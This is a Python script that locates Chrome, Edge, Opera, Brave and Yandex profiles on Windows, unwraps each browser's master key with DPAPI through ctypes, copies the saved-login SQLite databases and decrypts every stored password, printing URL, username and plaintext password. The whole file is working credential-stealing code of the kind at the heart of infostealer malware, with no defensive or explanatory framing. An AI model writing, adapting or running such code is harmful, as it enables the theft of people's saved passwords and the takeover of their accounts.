# decrypt_chrome_passwords_ctypes.py

import os
import json
import base64
import sqlite3
import shutil
import tempfile
import ctypes
from ctypes import wintypes, byref, Structure, POINTER, c_void_p, c_ulong, c_byte
from Crypto.Cipher import AES

# Windows DPAPI via ctypes
class DATA_BLOB(Structure):
    _fields_ = [
        ("cbData", wintypes.DWORD),
        ("pbData", POINTER(c_byte))
    ]

def dpapi_decrypt(encrypted_bytes: bytes) -> bytes:
    """Decrypt bytes using Windows DPAPI (CryptUnprotectData)."""
    blob_in = DATA_BLOB(len(encrypted_bytes),
                        ctypes.cast(ctypes.create_string_buffer(encrypted_bytes, len(encrypted_bytes)),
                                    POINTER(c_byte)))
    blob_out = DATA_BLOB()
    crypt32 = ctypes.windll.crypt32
    if crypt32.CryptUnprotectData(byref(blob_in), None, None, None, None, 0, byref(blob_out)):
        ptr = ctypes.cast(blob_out.pbData, POINTER(c_byte * blob_out.cbData))
        result = bytes(ptr.contents)
        ctypes.windll.kernel32.LocalFree(blob_out.pbData)
        return result
    else:
        raise ctypes.WinError()

# Paths
LOCALAPPDATA = os.getenv("LOCALAPPDATA")
APPDATA = os.getenv("APPDATA")

CHROMIUM_BROWSERS = [
    {"name": "Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data")},
    {"name": "Edge",   "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data")},
    {"name": "Opera",  "path": os.path.join(APPDATA, "Opera Software", "Opera Stable")},
    {"name": "Brave",  "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data")},
    {"name": "Yandex", "path": os.path.join(APPDATA, "Yandex", "YandexBrowser", "User Data")},
]

PROFILES = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"]

def get_chrome_key(local_state_path: str) -> bytes:
    """Extract AES key from Local State via DPAPI."""
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    enc_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return dpapi_decrypt(enc_key)

def decrypt_password(buff: bytes, key: bytes) -> str:
    """
    Decrypt Chrome password blob:
     - AES-GCM if prefix b'v10'
     - DPAPI otherwise
    """
    try:
        # AES-GCM (Chrome >=80)
        if buff.startswith(b'v10'):
            iv = buff[3:15]
            ciphertext = buff[15:-16]
            tag = buff[-16:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted.decode('utf-8', errors='ignore')
    except Exception:
        pass
    # Fallback DPAPI
    try:
        dec = dpapi_decrypt(buff)
        return dec.decode('utf-8', errors='ignore')
    except Exception:
        return ""

def extract_passwords():
    results = []
    for browser in CHROMIUM_BROWSERS:
        base = browser["path"]
        local_state = os.path.join(base, "Local State")
        if not os.path.isfile(local_state):
            continue
        try:
            key = get_chrome_key(local_state)
        except Exception:
            continue
        for profile in PROFILES:
            login_db = os.path.join(base, profile, "Login Data")
            if not os.path.isfile(login_db):
                continue
            # Copy DB to temp
            fd, tmp = tempfile.mkstemp(suffix=".db")
            os.close(fd)
            shutil.copy2(login_db, tmp)
            conn = sqlite3.connect(tmp)
            cursor = conn.cursor()
            try:
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for url, username, enc in cursor.fetchall():
                    if not enc:
                        continue
                    blob = enc if isinstance(enc, (bytes, bytearray)) else bytes(enc)
                    pwd = decrypt_password(blob, key)
                    results.append({
                        "browser": browser["name"],
                        "profile": profile,
                        "url": url,
                        "username": username,
                        "password": pwd
                    })
            except Exception:
                pass
            cursor.close()
            conn.close()
            os.remove(tmp)
    return results

if __name__ == "__main__":
    pw_list = extract_passwords()
    if not pw_list:
        print("Aucun mot de passe trouvé.")
    else:
        print("\n=== Mots de passe récupérés ===\n")
        for entry in pw_list:
            print(f"{entry['browser']} [{entry['profile']}]\nURL: {entry['url']}\nUser: {entry['username']}\nPass: {entry['password']}\n")
